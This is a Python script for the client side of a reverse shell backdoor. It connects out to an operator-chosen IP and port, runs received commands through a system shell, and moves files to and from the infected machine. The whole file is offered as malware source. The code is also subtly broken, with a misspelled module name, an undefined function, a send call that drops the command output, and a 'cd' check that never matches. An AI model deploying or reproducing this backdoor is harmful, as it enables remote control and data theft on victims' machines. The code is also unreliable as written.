import socket

import time

import subprocess

import json

import os

def data_send(data):

    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def data_recv():

    data = ''
    while True:

        try:
            data = data + s.recv(1024).decode().rstrip()
            return jason.loads(data)

        except ValueError:
            continue

def connected():
    while True:
        time.sleep(20)

        try:
            s.connect(('IP', 'Port')) # on the place of IP and Port put your system IP and Port you want to connect.
            shell()
            s.close()
            break

        except:
            connection()

def file_upload(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())


def file_download(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)

        except socket.timeout as e:
            break

    s.settimeout(None)
    f.close()

def shell():
    while True:
        command = data_recv()
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd':
            os.chdir(command[3:])
        elif command[:8] == 'download':
            file_upload(command[9:])
        elif command[:6] == 'upload':
            file_download(command[7:])
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            data_send()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connected()